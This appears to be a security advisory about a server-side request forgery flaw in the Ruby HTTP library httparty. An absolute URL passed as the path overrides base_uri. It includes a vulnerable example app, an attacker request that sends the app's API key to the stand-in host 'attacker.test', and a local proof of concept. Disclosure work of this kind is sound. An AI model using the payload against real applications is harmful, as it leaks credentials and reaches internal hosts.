  httparty Has Potential SSRF Vulnerability That Leads to API Key Leakage
  ## Summary

  There may be an SSRF vulnerability in httparty. This issue can pose a risk of leaking API keys, and it can also allow third parties to issue requests to internal servers.

  ## Details

  When httparty receives a path argument that is an absolute URL, it ignores the `base_uri` field. As a result, if a malicious user can control the path value, the application may unintentionally communicate with a host that the programmer did not anticipate.

  Consider the following example of a web application:

  ```rb
  require 'sinatra'
  require 'httparty'

  class RepositoryClient
    include HTTParty
    base_uri 'http://exmaple.test/api/v1/repositories/'
    headers 'X-API-KEY' => '1234567890'
  end

  post '/issue' do
    request_body = JSON.parse(request.body.read)
    RepositoryClient.get(request_body['repository_id']).body
    # do something
    json message: 'OK'
  end
  ```

  Now, suppose an attacker sends a request like this:

  ```
  POST /issue HTTP/1.1
  Host: localhost:10000
  Content-Type: application/json

  {
      "repository_id": "http://attacker.test",
      "title": "test"
  }
  ```

  In this case, httparty sends the `X-API-KEY` not to `http://example.test` but instead to `http://attacker.test`.

  A similar problem was reported and fixed in the HTTP client library axios in the past:
  <https://github.com/axios/axios/issues/6463>

  Also, Python's `urljoin` function has documented a warning about similar behavior:
  <https://docs.python.org/3.13/library/urllib.parse.html#urllib.parse.urljoin>

  ## PoC

  Follow these steps to reproduce the issue:

  1. Set up two simple HTTP servers.

     ```bash
     mkdir /tmp/server1 /tmp/server2
     echo "this is server1" > /tmp/server1/index.html
     echo "this is server2" > /tmp/server2/index.html
     python -m http.server -d /tmp/server1 10001 &
     python -m http.server -d /tmp/server2 10002 &
     ```

  2. Create a script (for example, `main.rb`):

     ```rb
     require 'httparty'

     class Client
       include HTTParty
       base_uri 'http://localhost:10001'
     end

     data = Client.get('http://localhost:10002').body
     puts data
     ```

  3. Run the script:

     ```bash
     $ ruby main.rb
     this is server2
     ```

  Although `base_uri` is set to `http://localhost:10001/`, httparty sends the request to `http://localhost:10002/`.


  ## Impact

  - Leakage of credentials: If an absolute URL is provided, any API keys or credentials configured in httparty may be exposed to unintended third-party hosts.
  - SSRF (Server-Side Request Forgery): Attackers can force the httparty-based program to send requests to other internal hosts within the network where the program is running.
  - Affected users: Any software that uses `base_uri` and does not properly validate the path parameter may be affected by this issue.
